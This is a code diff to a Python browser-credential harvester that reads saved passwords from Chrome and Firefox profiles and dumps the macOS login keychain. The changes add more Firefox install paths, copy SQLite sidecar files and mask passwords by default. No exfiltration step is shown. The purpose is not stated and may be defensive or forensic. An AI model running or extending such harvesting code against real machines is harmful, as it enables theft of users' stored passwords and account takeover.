@@ -31,9 +31,11 @@ import shutil
 import sqlite3
 import subprocess
 import tempfile
-from dataclasses import dataclass, asdict
+from dataclasses import dataclass, asdict, fields
 from pathlib import Path
 from typing import Any
+
+from utils.secure_string import SecureString
 
 logger = logging.getLogger(__name__)
 
@@ -47,13 +49,28 @@ class Credential:
     browser: str
     url: str
     username: str
-    password: str
+    password: SecureString
     profile: str = "Default"
     created: str = ""
     last_used: str = ""
 
-    def to_dict(self) -> dict[str, Any]:
-        return asdict(self)
+    def to_dict(self, *, include_secrets: bool = False) -> dict[str, Any]:
+        """Serialise to a plain dict.
+
+        Parameters
+        ----------
+        include_secrets:
+            When *False* (default), the ``password`` value is replaced with
+            ``"***"``.  Pass *True* to include the real password.
+        """
+        d: dict[str, Any] = {}
+        for f in fields(self):
+            value = getattr(self, f.name)
+            if isinstance(value, SecureString):
+                d[f.name] = value.reveal() if include_secrets else "***"
+            else:
+                d[f.name] = value
+        return d
 
 
 class BrowserCredentialHarvester:
@@ -68,6 +85,8 @@ class BrowserCredentialHarvester:
     def __init__(self, config: dict[str, Any] | None = None) -> None:
         self._platform = _get_platform()
         self._config = config or {}
+        self._profiles_cache: list[tuple[str, str, str]] | None = None
+        self._profiles_cache_time: float = 0.0
 
     def harvest_all(self) -> list[dict[str, Any]]:
         """Harvest credentials from all detected browsers.
@@ -101,6 +120,10 @@ class BrowserCredentialHarvester:
 
     def _get_chrome_profiles(self) -> list[tuple[str, str, str]]:
         """Return list of (browser_name, profile_path, local_state_path) for all Chromium browsers."""
+        import time as _time
+        now = _time.monotonic()
+        if self._profiles_cache is not None and (now - self._profiles_cache_time) < 5.0:
+            return self._profiles_cache
         profiles: list[tuple[str, str, str]] = []
 
         if self._platform == "darwin":
@@ -142,6 +165,8 @@ class BrowserCredentialHarvester:
                 if os.path.isfile(login_data):
                     profiles.append((browser, login_data, local_state))
 
+        self._profiles_cache = profiles
+        self._profiles_cache_time = now
         return profiles
 
     def _harvest_chrome(self) -> list[dict[str, Any]]:
@@ -152,8 +177,13 @@ class BrowserCredentialHarvester:
             tmp = tempfile.NamedTemporaryFile(delete=False, suffix=".db")
             tmp.close()
             try:
-                # Copy the database (it's locked by Chrome while running)
+                # Copy the database (it's locked by Chrome while running).
+                # Also copy WAL/SHM sidecar files to avoid a stale snapshot.
                 shutil.copy2(login_db_path, tmp.name)
+                for suffix in ("-wal", "-shm"):
+                    sidecar = login_db_path + suffix
+                    if os.path.exists(sidecar):
+                        shutil.copy2(sidecar, tmp.name + suffix)
 
                 conn = sqlite3.connect(tmp.name)
                 try:
@@ -187,14 +217,14 @@ class BrowserCredentialHarvester:
                                 browser=browser,
                                 url=url,
                                 username=username,
-                                password=password,
+                                password=SecureString.from_plain(password),
                                 profile=profile_name,
                             )
                             results.append(cred.to_dict())
                 finally:
                     conn.close()
 
-            except Exception as exc:
+            except (PermissionError, sqlite3.OperationalError, OSError) as exc:
                 logger.debug("Chrome profile harvest error (%s): %s", browser, exc)
             finally:
                 try:
@@ -365,22 +395,26 @@ class BrowserCredentialHarvester:
     def _get_firefox_profiles(self) -> list[str]:
         """Return paths to all Firefox profile directories."""
         if self._platform == "darwin":
-            base = os.path.expanduser("~/Library/Application Support/Firefox/Profiles")
+            bases = [os.path.expanduser("~/Library/Application Support/Firefox/Profiles")]
         elif self._platform == "linux":
-            base = os.path.expanduser("~/.mozilla/firefox")
+            bases = [
+                os.path.expanduser("~/.mozilla/firefox"),
+                os.path.expanduser("~/snap/firefox/common/.mozilla/firefox"),
+                os.path.expanduser("~/.var/app/org.mozilla.firefox/.mozilla/firefox"),
+            ]
         elif self._platform == "windows":
-            base = os.path.join(os.environ.get("APPDATA", ""), "Mozilla", "Firefox", "Profiles")
+            bases = [os.path.join(os.environ.get("APPDATA", ""), "Mozilla", "Firefox", "Profiles")]
         else:
             return []
 
-        if not os.path.isdir(base):
-            return []
-
         profiles = []
-        for entry in os.listdir(base):
-            profile_dir = os.path.join(base, entry)
-            if os.path.isdir(profile_dir) and os.path.isfile(os.path.join(profile_dir, "logins.json")):
-                profiles.append(profile_dir)
+        for base in bases:
+            if not os.path.isdir(base):
+                continue
+            for entry in os.listdir(base):
+                profile_dir = os.path.join(base, entry)
+                if os.path.isdir(profile_dir) and os.path.isfile(os.path.join(profile_dir, "logins.json")):
+                    profiles.append(profile_dir)
         return profiles
 
     def _harvest_firefox(self) -> list[dict[str, Any]]:
@@ -410,22 +444,22 @@ class BrowserCredentialHarvester:
                     username = self._firefox_decrypt(profile_dir, enc_username)
                     password = self._firefox_decrypt(profile_dir, enc_password)
 
-                    # If decryption fails, store the encrypted values
+                    # If decryption fails, store a safe placeholder (no ciphertext content)
                     if username is None:
-                        username = f"[encrypted:{enc_username[:20]}...]"
+                        username = "[encrypted]"
                     if password is None:
-                        password = f"[encrypted:{enc_password[:20]}...]"
+                        password = "[encrypted]"
 
                     cred = Credential(
                         browser="firefox",
                         url=url,
                         username=username,
-                        password=password,
+                        password=SecureString.from_plain(password),
                         profile=profile_name,
                     )
                     results.append(cred.to_dict())
 
-            except Exception as exc:
+            except (PermissionError, sqlite3.OperationalError, OSError) as exc:
                 logger.debug("Firefox profile harvest error: %s", exc)
 
         return results
@@ -468,7 +502,7 @@ class BrowserCredentialHarvester:
         try:
             # List all internet password entries
             result = subprocess.run(
-                ["security", "dump-keychain", "-d", os.path.expanduser("~/Library/Keychains/login.keychain-db")],
+                ["security", "dump-keychain", os.path.expanduser("~/Library/Keychains/login.keychain-db")],
                 capture_output=True, text=True, timeout=30,
             )
 
@@ -485,7 +519,9 @@ class BrowserCredentialHarvester:
                             browser="safari",
                             url=current_entry.get("server", ""),
                             username=current_entry.get("account", ""),
-                            password=current_entry.get("password", "[keychain-protected]"),
+                            password=SecureString.from_plain(
+                                current_entry.get("password", "[keychain-protected]")
+                            ),
                             profile="login",
                         )
                         results.append(cred.to_dict())
@@ -513,12 +549,14 @@ class BrowserCredentialHarvester:
                     browser="safari",
                     url=current_entry.get("server", ""),
                     username=current_entry.get("account", ""),
-                    password=current_entry.get("password", "[keychain-protected]"),
+                    password=SecureString.from_plain(
+                        current_entry.get("password", "[keychain-protected]")
+                    ),
                     profile="login",
                 )
                 results.append(cred.to_dict())
 
-        except Exception as exc:
+        except (PermissionError, sqlite3.OperationalError, OSError) as exc:
             logger.debug("Safari harvest error: %s", exc)
 
         return results
